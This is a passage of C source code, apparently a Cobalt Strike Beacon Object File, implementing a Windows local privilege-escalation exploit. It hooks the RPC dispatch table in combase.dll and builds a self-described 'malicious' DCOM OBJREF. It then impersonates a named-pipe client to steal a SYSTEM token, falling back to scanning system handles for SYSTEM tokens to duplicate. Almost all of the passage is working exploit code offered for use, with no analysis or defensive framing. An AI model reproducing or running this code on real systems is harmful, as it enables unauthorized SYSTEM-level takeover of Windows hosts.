 {
	 int occ[512];
	 size_t i, j;
	 /* Guard: unsigned underflow if text is shorter than pattern */
	 if (!text || !pattern || pattern_len == 0 || text_len < pattern_len)
		 return -1;
	 for (i = 0; i < 512; i++) occ[i] = -1;
	 for (i = 0; i < pattern_len; i++) occ[pattern[i] & 0xff] = (int)i;
	 i = 0;
	 while (i <= text_len - pattern_len) {
		 j = 0;
		 while (j < pattern_len && text[i + j] == pattern[j]) j++;
		 if (j == pattern_len) return (int)i;
		 i += pattern_len;
		 /* occ[] value is signed; subtract may wrap i — clamp to text_len to stay in bounds */
		 if (i < text_len) {
			 int adj = occ[text[i] & 0xff];
			 if (adj >= 0 && (size_t)adj <= i)
				 i -= (size_t)adj;
		 }
	 }
	 return -1;
 }
 
 /* Get module size from PE header */
 static SIZE_T get_module_size(void* base)
 {
	 unsigned char* p = (unsigned char*)base;
	 ULONG e_lfanew;
	 DWORD size_of_image;
	 if (p[0] != 'M' || p[1] != 'Z') return 0;
	 e_lfanew = *(ULONG*)(p + 0x3c);
	 if (e_lfanew > 0x1000) return 0;
	 p += e_lfanew;
	 if (p[0] != 'P' || p[1] != 'E') return 0;
 #ifdef _WIN64
	 size_of_image = *(DWORD*)(p + 0x50);
 #else
	 size_of_image = *(DWORD*)(p + 0x50);
 #endif
	 return (SIZE_T)size_of_image;
 }
 
 static int init_context(void)
 {
	 static const unsigned char orcb_guid[16] = { 0x70,0x07,0xf7,0x18,0x64,0x8e,0xcf,0x11,0x9a,0xf1,0x00,0x20,0xaf,0x6e,0x72,0xf4 };
	 int off;
	 GOD_RPC_SERVER_INTERFACE* rpc_if;
	 RPC_DISPATCH_TABLE rpc_dt;
	 MIDL_SERVER_INFO midl;
	 unsigned char* content;
	 void** dt_ptr;
	 short* fmt_ptr;
	 int i, n;
 
	 combase_base = (void*)api.pGetModuleHandleW(L"combase.dll");
	 if (!combase_base) {
		 BeaconPrintf(CALLBACK_ERROR, "[!] combase.dll not loaded\n");
		 return -1;
	 }
	 combase_size = get_module_size(combase_base);
	 if (!combase_size) {
		 BeaconPrintf(CALLBACK_ERROR, "[!] Failed to get combase.dll size from PE header\n");
		 return -1;
	 }
	LOGI( "[*] combase.dll base: %p size: %llu\n", combase_base, (unsigned long long)combase_size);
 
	 content = (unsigned char*)combase_base;
	 off = sunday_search(content, combase_size, orcb_guid, 16);
	 if (off < 4) {
		 BeaconPrintf(CALLBACK_ERROR, "[!] ORCB GUID not found in combase.dll\n");
		 return -1;
	 }
	 off -= 4; /* back up to the Length field */
	LOGI( "[*] ORCB interface found at offset 0x%x (Length=%lu)\n", off, *(ULONG*)(content + off));
 
	 rpc_if = (GOD_RPC_SERVER_INTERFACE*)(content + off);
	 dispatch_table_ptr = (void*)rpc_if->InterpreterInfo;
	 if (!dispatch_table_ptr) {
		 BeaconPrintf(CALLBACK_ERROR, "[!] InterpreterInfo is NULL\n");
		 return -1;
	 }
 
	 memcpy(&midl, rpc_if->InterpreterInfo, sizeof(midl));
	 dispatch_table_ptr = (void*)midl.DispatchTable;
	 if (!dispatch_table_ptr) {
		 BeaconPrintf(CALLBACK_ERROR, "[!] MIDL DispatchTable is NULL\n");
		 return -1;
	 }
 
	 memcpy(&rpc_dt, rpc_if->DispatchTable, sizeof(rpc_dt));
	 dt_ptr = (void**)dispatch_table_ptr;
	 use_protseq_ptr = dt_ptr[0];
	 if (!use_protseq_ptr) {
		 BeaconPrintf(CALLBACK_ERROR, "[!] UseProtseq function pointer is NULL\n");
		 return -1;
	 }
 
	 fmt_ptr = (short*)midl.FmtStringOffset;
	 if (!fmt_ptr) {
		 BeaconPrintf(CALLBACK_ERROR, "[!] FmtStringOffset is NULL\n");
		 return -1;
	 }
	 n = (int)rpc_dt.DispatchTableCount;
	 if (n < 1) {
		 BeaconPrintf(CALLBACK_ERROR, "[!] DispatchTableCount is %d\n", n);
		 return -1;
	 }
	 {
		 unsigned char* pstr = (unsigned char*)midl.ProcString;
		 unsigned proc_off  = (unsigned)(unsigned short)fmt_ptr[0];
		 /* Ensure the byte we need is inside the mapped combase image */
		 if (pstr &&
			 (size_t)(pstr - (unsigned char*)combase_base) < combase_size &&
			 proc_off + 19 < combase_size - (size_t)(pstr - (unsigned char*)combase_base))
			 use_protseq_param_count = pstr[proc_off + 19];
		 else
			 use_protseq_param_count = 4; /* safe fallback */
	 }
	 if (use_protseq_param_count < 4 || use_protseq_param_count > 14) use_protseq_param_count = 4;
	LOGI(
		"[*] init_context: dispatch_count=%lu proc_fmt_off=%d param_count=%u\n",
		(unsigned long)rpc_dt.DispatchTableCount, (int)fmt_ptr[0],
		(unsigned)use_protseq_param_count);
	 return 0;
 }
 
static void hook_rpc(void)
{
	 DWORD old = 0;
	 void* hook_fn = get_hook_func();
	 void* before = *(void**)dispatch_table_ptr;
	 if (!api.pVirtualProtect(dispatch_table_ptr, (SIZE_T)(PTR_SIZE * 1), PAGE_READWRITE, &old)) {
		 BeaconPrintf(CALLBACK_ERROR, "[!] VirtualProtect failed while installing hook\n");
		 return;
	 }
	 dispatch_table_old_protect = old;
	 *(void**)dispatch_table_ptr = hook_fn;
	 void* after = *(void**)dispatch_table_ptr;
	 hook_ptr_storage = use_protseq_ptr;
	 is_hook = 1;
	LOGI(
		"[*] hook_rpc: tbl=%p  before=%p  hook_fn=%p  after=%p  match=%d\n",
		dispatch_table_ptr, before, hook_fn, after, (after == hook_fn));
 }
 
static void restore_rpc(void)
{
	 if (is_hook && use_protseq_ptr) {
		 DWORD old;
		 if (api.pVirtualProtect(dispatch_table_ptr, (SIZE_T)PTR_SIZE, PAGE_READWRITE, &old)) {
			 *(void**)dispatch_table_ptr = use_protseq_ptr;
			 if (dispatch_table_old_protect)
				 api.pVirtualProtect(dispatch_table_ptr, (SIZE_T)PTR_SIZE, dispatch_table_old_protect, &old);
		 } else {
			 BeaconPrintf(CALLBACK_ERROR, "[!] restore_rpc: VirtualProtect failed, hook not removed\n");
		 }
	 }
	 is_hook = 0;
	 dispatch_table_old_protect = 0;
}
 
 static void stop_pipe(void)
 {
	 is_start = 0;
	 SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
	 HANDLE h = api.pCreateFileW(server_pipe, 0x80000000u | 0x40000000u, 3, &sa, 3, 0, NULL);
	 if (h != (HANDLE)-1 && h != NULL) {
		 char b = (char)0xaa;
		 DWORD w;
		 api.pReadFile(h, &b, 1, &w, NULL);
		 api.pCloseHandle(h);
	 }
 }
 
 static int token_is_system(HANDLE token)
 {
	 DWORD token_user_len = 0;
	 void* token_user_buf = NULL;
	 PSID sid = NULL;
	 PUCHAR sub_count = NULL;
	 PDWORD pSub = NULL;
	 int is_system = 0;
 
	 if (!token) return 0;
 
	 api.pGetTokenInformation(token, GOD_TokenUser, NULL, 0, &token_user_len);
	 if (token_user_len == 0 || token_user_len > 0x1000)
		 return 0;
 
	 token_user_buf = api.pCoTaskMemAlloc(token_user_len);
	 if (!token_user_buf)
		 return 0;
 
	 if (!api.pGetTokenInformation(token, GOD_TokenUser, token_user_buf, token_user_len, &token_user_len)) {
		 api.pCoTaskMemFree(token_user_buf);
		 return 0;
	 }
 
	 sid = (PSID)(*(void**)token_user_buf);
	 sub_count = api.pGetSidSubAuthorityCount(sid);
	 if (sub_count && *sub_count == 1) {
		 pSub = (PDWORD)api.pGetSidSubAuthority(sid, 0);
		 if (pSub && *pSub == 18)
			 is_system = 1;
	 }
 
	 api.pCoTaskMemFree(token_user_buf);
	 return is_system;
 }
 
 #define BAD_HANDLE ((HANDLE)(LONG_PTR)-1)
 
 static DWORD WINAPI pipe_server_thread(LPVOID unused)
 {
	 SECURITY_ATTRIBUTES sa;
	 PSECURITY_DESCRIPTOR psd = NULL;
	 ULONG sd_size = 0;
	 HANDLE pipe_handle = BAD_HANDLE;
	 (void)unused;
 
	 sa.nLength = sizeof(sa);
	 sa.lpSecurityDescriptor = NULL;
	 sa.bInheritHandle = TRUE;
 
	 if (!api.pConvertStringSecurityDescriptorToSecurityDescriptorW(L"D:(A;OICI;GA;;;WD)", 1, &psd, &sd_size)) {
		 BeaconPrintf(CALLBACK_ERROR, "[!] ConvertStringSecurityDescriptorToSecurityDescriptorW failed\n");
		 return 1;
	 }
	 sa.lpSecurityDescriptor = psd;
 
	 pipe_handle = api.pCreateNamedPipeW(server_pipe, PIPE_ACCESS_DUPLEX | GOD_FILE_FLAG_OVERLAPPED,
		 PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT, PIPE_UNLIMITED_INSTANCES, 521, 0, 123, &sa);
	 if (psd) {
		 api.pLocalFree((HLOCAL)psd);
		 psd = NULL;
	 }
 
	 if (pipe_handle == BAD_HANDLE || !pipe_handle) {
		 BeaconPrintf(CALLBACK_ERROR, "[!] CreateNamedPipe failed\n");
		 log_last_error_status("CreateNamedPipeW");
		 pipe_connected = -1;
		 return 1;
	 }
	 LOGK( "[*] CreateNamedPipe %ls\n", server_pipe);
 
	 OVERLAPPED ov = { 0 };
	 ov.hEvent = api.pCreateEventW(NULL, TRUE, FALSE, NULL);
	 if (!ov.hEvent) {
		 BeaconPrintf(CALLBACK_ERROR, "[!] CreateEventW failed\n");
		 api.pCloseHandle(pipe_handle);
		 pipe_connected = -1;
		 return 1;
	 }
	 if (!api.pConnectNamedPipe(pipe_handle, &ov)) {
		 DWORD err = api.pGetLastError();
		LOGI( "[*] ConnectNamedPipe initial status=%lu (0x%08lx)\n",
			(unsigned long)err, (unsigned long)err);
		 if (err == GOD_ERROR_IO_PENDING) {
			 if (api.pWaitForSingleObject(ov.hEvent, 15000) == GOD_WAIT_TIMEOUT) {
				 BeaconPrintf(CALLBACK_ERROR, "Named pipe timed out\n");
				 api.pCloseHandle(ov.hEvent);
				 api.pCloseHandle(pipe_handle);
				 pipe_connected = -1;
				 return 1;
			 }
		 } else if (err != GOD_ERROR_PIPE_CONNECTED) {
			 BeaconPrintf(CALLBACK_ERROR, "[!] ConnectNamedPipe fail\n");
			 BeaconPrintf(CALLBACK_ERROR, "[!] ConnectNamedPipe unexpected status=%lu (0x%08lx)\n",
				 (unsigned long)err, (unsigned long)err);
			 api.pCloseHandle(ov.hEvent);
			 api.pCloseHandle(pipe_handle);
			 pipe_connected = -1;
			 return 1;
		 }
	 }
	 api.pCloseHandle(ov.hEvent);
	 LOGK( "[*] Pipe Connected!\n");
	 pipe_connected = 1;
 
	 if (!api.pImpersonateNamedPipeClient(pipe_handle)) {
		 BeaconPrintf(CALLBACK_ERROR, "[!] ImpersonateNamedPipeClient fail\n");
		 log_last_error_status("ImpersonateNamedPipeClient");
		 api.pCloseHandle(pipe_handle);
		 return 1;
	 }
 
	 /* Prefer the impersonation token we just received from the named pipe client.
		This avoids the much riskier global handle walk in a BOF context. */
	 {
		 HANDLE thread_token = NULL;
		 HANDLE primary = NULL;
		 if (api.pOpenThreadToken(api.pGetCurrentThread(), GOD_TOKEN_ELEVATION, FALSE, &thread_token)) {
			LOGI( "[*] OpenThreadToken on pipe client succeeded\n");
			 if (token_is_system(thread_token) &&
				 api.pDuplicateTokenEx(thread_token, GOD_TOKEN_ELEVATION, NULL, GOD_TokenImpersonationLevel, GOD_TokenPrimary, &primary)) {
				 if (system_token) api.pCloseHandle(system_token);
				 system_token = primary;
				 LOGI( "[*] Captured impersonation token from pipe client\n");
				 api.pCloseHandle(thread_token);
				 api.pRevertToSelf();
				 api.pCloseHandle(pipe_handle);
				 return 0;
			 }
			LOGI( "[*] Pipe client token was not SYSTEM, falling back to SYSTEM token search\n");
			 if (primary) api.pCloseHandle(primary);
			 api.pCloseHandle(thread_token);
		 } else {
			 BeaconPrintf(CALLBACK_ERROR, "[!] OpenThreadToken failed err=%lu\n",
						  (unsigned long)api.pGetLastError());
		 }
	 }
 
	 /* ListProcessTokens(-1) to find S-1-5-18 with ImpersonationLevel >= Impersonation and IntegrityLevel >= SystemIntegrity */
	LOGI( "[*] Searching for SYSTEM token in process handles\n");
	 {
		 ULONG buf_size = 1024 * 1024;
		 void* buf = NULL;
		 ULONG ret_len = 0;
		 LONG status;
		 SYSTEM_HANDLE_INFORMATION_EX_HEADER* hdr;
		 size_t entry_size = sizeof(SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX);
		 size_t header_size = sizeof(SYSTEM_HANDLE_INFORMATION_EX_HEADER);
		 HANDLE self = api.pGetCurrentProcess();
		 DWORD self_pid = api.pGetCurrentProcessId();
 
		 do {
			 if (buf) api.pCoTaskMemFree(buf);
			 buf = api.pCoTaskMemAlloc(buf_size);
			 if (!buf) break;
			 status = api.pNtQuerySystemInformation(SYSTEM_EXTENDED_HANDLE_INFO, buf, buf_size, &ret_len);
			 if (status != STATUS_INFO_LENGTH_MISMATCH) break;
			 buf_size *= 2;
		 } while (buf_size < 16 * 1024 * 1024);
 
		 if (status == 0 && buf) {
			 hdr = (SYSTEM_HANDLE_INFORMATION_EX_HEADER*)buf;
			 ULONG_PTR num_handles = (ULONG_PTR)hdr->NumberOfHandles;
			 HANDLE process_handle = NULL;
			 int last_pid = -1;
			 size_t idx;
 
			 for (idx = 0; idx < num_handles; idx++) {
				 SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX* ent = (SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX*)((char*)buf + header_size + idx * entry_size);
				 int pid = (int)(ULONG_PTR)ent->ProcessID;
				 HANDLE dup = NULL;
				 HANDLE token = NULL;
				 void* token_user_buf = NULL;
				 DWORD token_user_len = 0;
				 void* token_integrity_buf = NULL;
				 DWORD token_integrity_len = 0;
				 PSID sid = NULL;
				 DWORD sid_len;
				 PUCHAR sub_count;
				 DWORD sub_idx;
 
				 if (last_pid != pid) {
					 if (process_handle) { api.pCloseHandle(process_handle); process_handle = NULL; }
					 process_handle = api.pOpenProcess(GOD_DUPLICATE_HANDLE_ACCESS, FALSE, (DWORD)pid);
					 last_pid = pid;
				 }
				 if (!process_handle) continue;
 
				 if (token_type_index >= 0 && ent->ObjectType != (USHORT)token_type_index) continue;
 
				 if (api.pNtDuplicateObject(process_handle, (HANDLE)(ULONG_PTR)ent->HandleValue, self, &dup, GOD_TOKEN_ELEVATION, 0, 0) != STATUS_SUCCESS)
					 continue;
				 token = dup;
				 dup = NULL;
				 api.pGetTokenInformation(token, GOD_TokenUser, NULL, 0, &token_user_len);
				 if (token_user_len == 0 || token_user_len > 0x1000) {
					 api.pCloseHandle(token);
					 continue;
				 }
				 token_user_buf = api.pCoTaskMemAlloc(token_user_len);
				 if (!token_user_buf) { api.pCloseHandle(token); continue; }
				 if (!api.pGetTokenInformation(token, GOD_TokenUser, token_user_buf, token_user_len, &token_user_len)) {
					 api.pCoTaskMemFree(token_user_buf); api.pCloseHandle(token);
					 continue;
				 }
				 sid = (PSID)(*(void**)token_user_buf);
				 sub_count = api.pGetSidSubAuthorityCount(sid);
				 if (!sub_count || *sub_count != 1) {
					 api.pCoTaskMemFree(token_user_buf); api.pCloseHandle(token);
					 continue;
				 }
				 /* Check SID is 1-5-18 */
				 {
					 PDWORD pSub = (PDWORD)api.pGetSidSubAuthority(sid, 0);
					 if (!pSub || *pSub != 18) {
						 api.pCoTaskMemFree(token_user_buf); api.pCloseHandle(token);
						 continue;
					 }
				 }
				 /* IntegrityLevel >= SystemIntegrity (0x4000) */
				 {
					 DWORD il_len = 0;
					 void* il_buf = NULL;
					 api.pGetTokenInformation(token, GOD_TokenIntegrityLevel, NULL, 0, &il_len);
					 if (il_len > 0 && il_len <= 256) {
						 il_buf = api.pCoTaskMemAlloc(il_len);
						 if (il_buf && api.pGetTokenInformation(token, GOD_TokenIntegrityLevel, il_buf, il_len, &il_len)) {
							 PSID il_sid = (PSID)(*(void**)il_buf); /* SID_AND_ATTRIBUTES.Label.Sid */
							 PUCHAR il_count = api.pGetSidSubAuthorityCount(il_sid);
							 if (il_count && *il_count >= 1) {
								 PDWORD il_rid = (PDWORD)api.pGetSidSubAuthority(il_sid, (DWORD)(*il_count - 1));
								 if (!il_rid || *il_rid < GOD_SystemIntegrityRid) {
									 api.pCoTaskMemFree(il_buf); api.pCoTaskMemFree(token_user_buf);
									 api.pCloseHandle(token);
									 continue;
								 }
							 }
						 }
						 if (il_buf) api.pCoTaskMemFree(il_buf);
					 }
				 }
				 /* Found SYSTEM token; duplicate as primary for CreateProcess */
				 {
					 HANDLE primary = NULL;
					 if (api.pDuplicateTokenEx(token, GOD_TOKEN_ELEVATION, NULL, GOD_TokenImpersonationLevel, GOD_TokenPrimary, &primary)) {
						 if (system_token) api.pCloseHandle(system_token);
						 system_token = primary;
						 LOGK( "[*] Find System Token PID:%u\n", (unsigned)pid);
						 api.pCoTaskMemFree(token_user_buf);
						 api.pCloseHandle(token);
						 if (process_handle) api.pCloseHandle(process_handle);
						 api.pCoTaskMemFree(buf);
						 api.pRevertToSelf();
						 api.pCloseHandle(pipe_handle);
						 return 0;
					 }
				 }
				 api.pCoTaskMemFree(token_user_buf);
				 api.pCloseHandle(token);
				 if (dup) api.pCloseHandle(dup);
			 }
			 if (process_handle) api.pCloseHandle(process_handle);
		 }
		 if (buf) api.pCoTaskMemFree(buf);
	 }
	 BeaconPrintf(CALLBACK_ERROR, "[!] SYSTEM token search failed\n");
	 api.pRevertToSelf();
	 api.pCloseHandle(pipe_handle);
	 return 0;
 }
 
 /* Minimal IUnknown for CreateObjrefMoniker */
 static ULONG WINAPI fake_AddRef(IUnknown* This) { return 1; }
 static ULONG WINAPI fake_Release(IUnknown* This) { return 1; }
 static HRESULT WINAPI fake_QueryInterface(IUnknown* This, REFIID riid, void** ppv) {
	 static const GUID IID_IUnknown_local = {0,0,0,{0xC0,0,0,0,0,0,0,0x46}};
	 if (IsEqualIID(riid, &IID_IUnknown_local)) {
		 *ppv = This;
		 return 0; /* S_OK */
	 }
	 *ppv = NULL;
	 return (HRESULT)0x80004002; /* E_NOINTERFACE */
 }
 /* Initialized at runtime to avoid BOF relocation issues with static fn-ptr inits */
 static IUnknownVtbl fake_vtbl;
 static IUnknown fake_unknown;
 
 /* IStream over buffer for CoUnmarshalInterface */
 typedef struct {
	 IStreamVtbl* vtbl;
	 unsigned char* data;
	 size_t size;
	 size_t pos;
 } BufferStream;
 
 static HRESULT WINAPI bufstream_QueryInterface(IStream* This, REFIID riid, void** ppv) {
	 if (IsEqualIID(riid, &IID_IUnknown) || IsEqualIID(riid, &IID_IStream)) { *ppv = This; return 0; }
	 *ppv = NULL; return -1;
 }
 static ULONG WINAPI bufstream_AddRef(IStream* This) { return 1; }
 static ULONG WINAPI bufstream_Release(IStream* This) { return 1; }
 static HRESULT WINAPI bufstream_Read(IStream* This, void* pv, ULONG cb, ULONG* pcbRead) {
	 BufferStream* s = (BufferStream*)This;
	 ULONG to_read = (cb < (ULONG)(s->size - s->pos)) ? cb : (ULONG)(s->size - s->pos);
	 if (to_read) memcpy(pv, s->data + s->pos, to_read);
	 s->pos += to_read;
	 if (pcbRead) *pcbRead = to_read;
	 return 0;
 }
 static HRESULT WINAPI bufstream_Seek(IStream* This, LARGE_INTEGER dlibMove, DWORD dwOrigin, ULARGE_INTEGER* plibNewPosition) {
	 BufferStream* s = (BufferStream*)This;
	 LONGLONG newpos = (LONGLONG)s->pos;
	 if (dwOrigin == 0) newpos = dlibMove.QuadPart;
	 else if (dwOrigin == 1) newpos += dlibMove.QuadPart;
	 else if (dwOrigin == 2) newpos = (LONGLONG)s->size + dlibMove.QuadPart;
	 if (newpos < 0) newpos = 0;
	 if (newpos > (LONGLONG)s->size) newpos = (LONGLONG)s->size;
	 s->pos = (size_t)newpos;
	 if (plibNewPosition) plibNewPosition->QuadPart = (ULONGLONG)s->pos;
	 return 0;
 }
 static HRESULT WINAPI bufstream_Stat(IStream* This, STATSTG* pstatstg, DWORD grfStatFlag) {
	 BufferStream* s = (BufferStream*)This;
	 memset(pstatstg, 0, sizeof(*pstatstg));
	 pstatstg->cbSize.QuadPart = (ULONGLONG)s->size;
	 return 0;
 }
 static HRESULT WINAPI bufstream_Clone(IStream* This, IStream** ppstm) { return -1; }
 static HRESULT WINAPI bufstream_CopyTo(IStream* This, IStream* pstm, ULARGE_INTEGER cb, ULARGE_INTEGER* pcbRead, ULARGE_INTEGER* pcbWritten) { return -1; }
 static HRESULT WINAPI bufstream_Commit(IStream* This, DWORD grfCommitFlags) { return 0; }
 static HRESULT WINAPI bufstream_Revert(IStream* This) { return -1; }
 static HRESULT WINAPI bufstream_LockRegion(IStream* This, ULARGE_INTEGER libOffset, ULARGE_INTEGER cb, DWORD dwLockType) { return -1; }
 static HRESULT WINAPI bufstream_UnlockRegion(IStream* This, ULARGE_INTEGER libOffset, ULARGE_INTEGER cb, DWORD dwLockType) { return -1; }
 static HRESULT WINAPI bufstream_SetSize(IStream* This, ULARGE_INTEGER libNewSize) { return -1; }
 static HRESULT WINAPI bufstream_Write(IStream* This, const void* pv, ULONG cb, ULONG* pcbWritten) { return -1; }
 
 /* Initialized at runtime to avoid BOF relocation issues with static fn-ptr inits */
 static IStreamVtbl bufstream_vtbl;
 
 /* Base64 decode — handles padding, whitespace, and rejects all other non-alphabet chars */
 static int b64_char_val(unsigned char c)
 {
	 if (c >= 'A' && c <= 'Z') return c - 'A';
	 if (c >= 'a' && c <= 'z') return c - 'a' + 26;
	 if (c >= '0' && c <= '9') return c - '0' + 52;
	 if (c == '+') return 62;
	 if (c == '/') return 63;
	 return -1;
 }
 
 static size_t b64_decode(const char* in, unsigned char* out, size_t out_max)
 {
	 size_t n = 0;
	 int acc = 0, bits = 0, v;
	 unsigned char c;
 
	 while ((c = (unsigned char)*in++) != '\0') {
		 if (c == '=') break;
		 if (c == ' ' || c == '\t' || c == '\r' || c == '\n') continue;
		 v = b64_char_val(c);
		 if (v < 0) continue;
		 acc = (acc << 6) | v;
		 bits += 6;
		 if (bits >= 8) {
			 bits -= 8;
			 if (n < out_max) out[n++] = (unsigned char)(acc >> bits);
		 }
	 }
	 return n;
 }
 
 /* ObjRef parse: read Flags, PublicRefs, OXID, OID, IPID from STDOBJREF */
 static void objref_parse_standard(const unsigned char* p, size_t len, ULONG* flags, ULONG* public_refs, ULONGLONG* oxid, ULONGLONG* oid, unsigned char* ipid)
 {
	 if (len < 8+8+16) return;
	 if (flags) *flags = *(ULONG*)(p + 0);
	 if (public_refs) *public_refs = *(ULONG*)(p + 4);
	 if (oxid) *oxid = *(ULONGLONG*)(p + 8);
	 if (oid) *oid  = *(ULONGLONG*)(p + 16);
	 if (ipid) memcpy(ipid, p + 24, 16);
 }
 
 /* Build malicious ObjRef (IID_IUnknown, Standard with DualStringArray: EPM_PROTOCOL_TCP "127.0.0.1", Security 0xa 0xffff null) */
 static size_t build_objref(unsigned char* out, size_t out_max, ULONG flags, ULONG public_refs, ULONGLONG oxid, ULONGLONG oid, const unsigned char* ipid)
 {
	 /* StringBinding: TowerID 0x0007, "127.0.0.1\0\0" (Unicode) */
	 /* SecurityBinding: 0x000a, 0xffff, "\0\0" */
	 static const WCHAR binding[] = L"127.0.0.1";
	 size_t sb_len = 2 + sizeof(binding) + sizeof(WCHAR); /* towerid + string\0 + extra \0 */
	 size_t sec_len = 2 + 2 + 4; /* AuthnSvc, AuthzSvc, null null */
	 size_t dual_len = (sb_len + sec_len) / 2;
	 unsigned char* p = out;
	 static const unsigned char IID_IUnknown[16] = {0,0,0,0,0,0,0,0,0xc0,0,0,0,0,0,0,0x46};
 
	 if (out_max < 4+4+16 + 4+4+8+8+16 + 2+2+sb_len+sec_len) return 0;
	 *(ULONG*)(p) = OBJREF_SIGNATURE; p += 4;
	 *(ULONG*)(p) = 1; p += 4;
	 memcpy(p, IID_IUnknown, 16); p += 16;
	 *(ULONG*)(p) = flags; p += 4;
	 *(ULONG*)(p) = public_refs; p += 4;
	 *(ULONGLONG*)(p) = oxid; p += 8;
	 *(ULONGLONG*)(p) = oid; p += 8;
	 memcpy(p, ipid, 16); p += 16;
	 *(USHORT*)(p) = (USHORT)dual_len; p += 2;
	 *(USHORT*)(p) = (USHORT)(sb_len/2); p += 2;
	 *(USHORT*)(p) = EPM_PROTOCOL_TCP; p += 2;
	 for (size_t i = 0; binding[i]; i++) { *(USHORT*)(p) = (USHORT)binding[i]; p += 2; }
	 *(USHORT*)(p) = 0; p += 2;
	 *(USHORT*)(p) = 0; p += 2;
	 *(USHORT*)(p) = 0x0a; p += 2;
	 *(USHORT*)(p) = 0xffff; p += 2;
	 *(USHORT*)(p) = 0; p += 2;
	 *(USHORT*)(p) = 0; p += 2;
	 return (size_t)(p - out);
 }
 
 /* Pre-built malicious objref — populated before hook is installed */
 static unsigned char g_malicious_buf[512];
 static size_t        g_malicious_len = 0;
 
 /* Phase 1: build the malicious OBJREF. Call BEFORE hook_rpc(). */
 static int prepare_objref(void)
 {
	 IBindCtx* pbc = NULL;
	 IMoniker* pmk = NULL;
	 WCHAR* display_name = NULL;
	 unsigned char objref_buf[512];
	 size_t objref_len;
	 ULONG std_flags = 0;
	 ULONG std_public_refs = 0;
	 ULONGLONG oxid, oid;
	 unsigned char ipid[16];
	 HRESULT hr;
 
	LOGI( "[*] prepare: CreateBindCtx\n");
	 if (api.pCreateBindCtx(0, &pbc) != 0 || !pbc) {
		 BeaconPrintf(CALLBACK_ERROR, "[!] prepare: CreateBindCtx failed\n");
		 return -1;
	 }
	LOGI( "[*] prepare: CreateObjrefMoniker\n");
	 if (api.pCreateObjrefMoniker((IUnknown*)&fake_unknown, &pmk) != 0 || !pmk) {
		 BeaconPrintf(CALLBACK_ERROR, "[!] prepare: CreateObjrefMoniker failed\n");
		 pbc->lpVtbl->Release(pbc);
		 return -1;
	 }
	LOGI( "[*] prepare: GetDisplayName\n");
	 hr = pmk->lpVtbl->GetDisplayName(pmk, pbc, NULL, &display_name);
	 pmk->lpVtbl->Release(pmk);
	 pbc->lpVtbl->Release(pbc);
	 if (hr != 0 || !display_name) {
		 BeaconPrintf(CALLBACK_ERROR, "[!] prepare: GetDisplayName failed hr=0x%08x\n", (unsigned)hr);
		 return -1;
	 }
	LOGI( "[*] prepare: decoding objref\n");
	 {
		 WCHAR* d = display_name;
		 while (*d == L'o' || *d == L'b' || *d == L'j' || *d == L'r' || *d == L'e' || *d == L'f' || *d == L':') d++;
		 char b64[384];
		 size_t j = 0;
		 while (j < 380 && *d) {
			 if (*d != L':') b64[j++] = (char)(*d & 0xff);
			 d++;
		 }
		 b64[j] = '\0';
		 objref_len = b64_decode(b64, objref_buf, sizeof(objref_buf));
		 api.pCoTaskMemFree(display_name);
	 }
	 if (objref_len < 4+4+16+4+4+8+8+16) {
		 BeaconPrintf(CALLBACK_ERROR, "[!] prepare: objref too short (%llu bytes)\n", (unsigned long long)objref_len);
		 return -1;
	 }
	LOGI( "[*] prepare: building malicious objref\n");
	 objref_parse_standard(objref_buf + 4+4+16, objref_len - (4+4+16), &std_flags, &std_public_refs, &oxid, &oid, ipid);
	LOGI( "[*] DCOM obj OXID: 0x%llx\n", (unsigned long long)oxid);
	LOGI( "[*] DCOM obj OID: 0x%llx\n", (unsigned long long)oid);
	LOGI( "[*] DCOM obj Flags: 0x%lx\n", (unsigned long)std_flags);
	LOGI( "[*] DCOM obj PublicRefs: 0x%lx\n", (unsigned long)std_public_refs);
	 g_malicious_len = build_objref(g_malicious_buf, sizeof(g_malicious_buf), std_flags, std_public_refs, oxid, oid, ipid);
	 if (!g_malicious_len) {
		 BeaconPrintf(CALLBACK_ERROR, "[!] prepare: build_objref failed\n");
		 return -1;
	 }
	LOGI( "[*] prepare: objref ready (%llu bytes)\n", (unsigned long long)g_malicious_len);
	 return 0;
 }
 
 static void trigger_fallback_unmarshal(void)
 {
	 BufferStream stream_impl;
	 IStream* pstm = (IStream*)&stream_impl;
	 void* ppv = NULL;
	 HRESULT hr;
	 static const GUID IID_IUnknown = {0,0,0,{0xC0,0,0,0,0,0,0,0x46}};
 
	 if (pipe_connected || !g_malicious_len)
		 return;
 
	LOGI( "[*] fire: fallback CoUnmarshalInterface (objref len=%llu)\n", (unsigned long long)g_malicious_len);
	 stream_impl.vtbl = &bufstream_vtbl;
	 stream_impl.data = g_malicious_buf;
	 stream_impl.size = g_malicious_len;
	 stream_impl.pos  = 0;
	 hr = api.pCoUnmarshalInterface(pstm, (REFIID)&IID_IUnknown, &ppv);
	LOGI( "[*] fire: CoUnmarshalInterface hr=0x%08x\n", (unsigned)hr);
	if (FAILED(hr))
		 LOGI( "[*] fire: CoUnmarshalInterface failed with pipe_connected=%d\n",
					  pipe_connected);
	 if (ppv) {
		 ((IUnknown*)ppv)->lpVtbl->Release((IUnknown*)ppv);
	 }
 }
 
 static void trigger_with_fallbacks(void)
 {
	 trigger_fallback_unmarshal();
	if (!pipe_connected)
		 LOGI( "[*] fire: no pipe connection after fallback attempt\n");
 }
 
 /* Minimal IClassFactory for CoRegisterClassObject trigger — vtable init'd at runtime */
 typedef struct { IClassFactoryVtbl* lpVtbl; } FakeClassFactory;
 static IClassFactoryVtbl fake_cf_vtbl;
 static FakeClassFactory  fake_cf;
 
 static HRESULT WINAPI fake_cf_QueryInterface(IClassFactory* This, REFIID riid, void** ppv) {
	 static const GUID IID_IUnknown_cf   = {0,0,0,{0xC0,0,0,0,0,0,0,0x46}};
	 static const GUID IID_IClassFactory = {0x00000001,0,0,{0xC0,0,0,0,0,0,0,0x46}};
	 if (IsEqualIID(riid, &IID_IUnknown_cf) || IsEqualIID(riid, &IID_IClassFactory)) { *ppv = This; return 0; }
	 *ppv = NULL; return (HRESULT)0x80004002;
 }
 static ULONG   WINAPI fake_cf_AddRef(IClassFactory* This)  { return 1; }
 static ULONG   WINAPI fake_cf_Release(IClassFactory* This) { return 1; }
